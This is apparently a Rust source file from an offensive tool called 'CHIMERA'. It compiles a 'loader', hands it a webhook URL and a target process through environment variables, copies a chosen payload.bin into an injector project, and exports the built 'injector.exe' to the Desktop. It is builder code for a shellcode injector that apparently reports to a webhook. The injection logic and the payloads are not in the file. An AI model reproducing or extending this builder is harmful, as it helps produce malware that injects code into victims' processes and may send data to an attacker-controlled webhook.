use std::fs;
use std::path::Path;
use std::path::PathBuf;

pub fn compile_loader(
    target: &str, 
    webhook: Option<&String>, 
    process: Option<&String>,
    relative_path: &str
) {
    let current_path = std::env::current_dir().expect("Failed to get current directory");
    let full_path = current_path.join(relative_path);

    println!("[CHIMERA][i] Starting compilation for: {}", target);

    let mut cmd = std::process::Command::new("cargo");
    cmd.arg("run")
       .arg("--release")
       .arg("--target")
       .arg(target);

    if let Some(url) = webhook {
        cmd.env("CHIMERA_WEBHOOK", url);
    }

    if let Some(proc_dir) = process {
        cmd.env("CHIMERA_TARGET", proc_dir);
    }

    cmd.current_dir(full_path);
    
    let status = cmd.status().expect("Failed to execute cargo build");

    if status.success() {
        println!("[CHIMERA][+] Compilation successful!");
    } else {
        println!("[CHIMERA][!] Compilation failed!");
    }
}

pub fn handle_payload(user_input: &str, current_inj_dir: &str) -> Result<(), String> {
    let clean_input = user_input.trim().to_lowercase();
    let source_path: String;

    let internal_path = format!("src/payloads/{}.bin", clean_input);
    
    if Path::new(&internal_path).exists() {
        source_path = internal_path;
    } else {
        let path = Path::new(&clean_input);
        
        if path.extension().and_then(|s| s.to_str()) != Some("bin") {
            return Err(format!("Error: '{}' is not a recognized internal payload and is not a .bin file.", clean_input));
        }
        if !path.exists() {
            return Err(format!("Error: Payload not found in src/payloads/ or path: '{}'", clean_input));
        }
        source_path = clean_input;
    }

    let target_src_dir = format!("{}/src", current_inj_dir);
    let target_bin_path = format!("{}/payload.bin", target_src_dir);
    let target_folder = format!("{}/target", current_inj_dir);

    if Path::new(&target_folder).exists() {
        fs::remove_dir_all(&target_folder).map_err(|e| e.to_string())?;
    }
    
    if Path::new(&target_bin_path).exists() {
        fs::remove_file(&target_bin_path).map_err(|e| e.to_string())?;
    }

    fs::copy(&source_path, &target_bin_path).map_err(|e| e.to_string())?;
    
    println!("[CHIMERA][+] Payload successfully synced: {}", source_path);
    Ok(())
}

pub fn export_binary(relative_path: &str, target_os: &str) -> Result<(), String> {
    let current_path = std::env::current_dir().map_err(|e| e.to_string())?;
    
    let binary_name = "injector.exe"; 
    let source_file = current_path
        .join(relative_path)
        .join("target")
        .join(target_os)
        .join("release")
        .join(binary_name);

    if !source_file.exists() {
        return Err("Compiled binary not found. Check if the compilation finished correctly.".to_string());
    }

    let mut dest_dir = PathBuf::new();

    if cfg!(target_os = "windows") {
        if let Some(home) = std::env::var_os("USERPROFILE") {
            dest_dir = PathBuf::from(home).join("Desktop");
        }
    } else if cfg!(target_os = "linux") {
        if let Some(home) = std::env::var_os("HOME") {
            dest_dir = PathBuf::from(home.clone()).join("Desktop");
            if !dest_dir.exists() {
                dest_dir = PathBuf::from(home).join("desktop");
            }
        }
    }

    if dest_dir.as_os_str().is_empty() || !dest_dir.exists() {
        dest_dir = current_path.join("Builds");
        if !dest_dir.exists() {
            fs::create_dir(&dest_dir).map_err(|e| e.to_string())?;
        }
    }

    let dest_path = dest_dir.join(binary_name);

    fs::copy(&source_file, &dest_path).map_err(|e| e.to_string())?;
    
    println!("[CHIMERA][+] Binary exported to: {:?}", dest_path);
    Ok(())
}